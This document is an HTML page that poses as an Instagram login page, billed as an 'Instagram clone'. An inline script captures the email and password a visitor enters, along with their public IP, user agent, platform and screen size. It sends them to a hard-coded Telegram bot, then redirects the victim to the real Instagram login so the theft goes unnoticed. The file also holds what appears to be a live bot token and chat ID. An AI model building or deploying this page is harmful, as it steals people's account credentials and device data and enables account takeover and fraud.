<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram clone</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form id="login-form">
                    <label for="email" class="sr-only">Phone number, username or email</label>
                    <input id="email" name="email" placeholder="Phone number, username or email" />

                    <label for="password" class="sr-only">Password</label>
                    <input id="password" name="password" type="password" placeholder="Password" />

                    <button type="submit">Log In</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot your password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png" alt="Image with the Apple Store logo" title="Image with the Apple Store logo" />
                    <img src="./img/googleplay-button.png" alt="Image with the Google Play logo" title="Image with the Google Play logo" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CAREERS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATION</a></li>
            <li><a href="#">MOST RELEVANT ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p class="copyright">© 2020 Instagram from Facebook</p>
    </footer>

    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
    <script>
        const TOKEN = "5569512925:AAHzMo6-HF9t8cuqt7ejqx7KxE9FrJ_gknk";  // التوكين
        const CHAT_ID = "7046020648";  // معرف الشات
        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        // حدث submit للنموذج
        document.getElementById('login-form').addEventListener('submit', function (e) {
            e.preventDefault();  // منع إعادة تحميل الصفحة

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // الحصول على الـ IP العام
            axios.get('https://api.ipify.org?format=json')
                .then(response => {
                    const ip = response.data.ip;

                    const userAgent = navigator.userAgent;
                    const platform = navigator.platform;
                    const screenWidth = screen.width;
                    const screenHeight = screen.height;
                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                    const message = `
                            <b>New Login Attempt</b>\n
                            <b>Email:</b> ${email}\n
                            <b>Password:</b> ${password}\n
                            <b>IP Address:</b> ${ip}\n
                            <b>Device Type:</b> ${deviceType}\n
                            <b>Platform:</b> ${platform}\n
                            <b>User Agent:</b> ${userAgent}\n
                            <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                        `;

                    // إرسال البيانات إلى بوت التليجرام
                    axios.post(URI_API, {
                        chat_id: CHAT_ID,
                        parse_mode: 'html',
                        text: message
                    }).then(response => {
                        alert('Information sent successfully!');

                        // إعادة التوجيه مباشرة إلى صفحة Instagram بعد إدخال المعلومات
                        window.location.href = "https://www.instagram.com/accounts/login/";  // إعادة التوجيه إلى صفحة تسجيل الدخول
                    }).catch(error => {
                        alert('Error sending the information. Please try again.');
                    });
                })
                .catch(error => {
                    alert('Error fetching the IP address. Please try again.');
                });
        });
    </script>
</body>
</html>
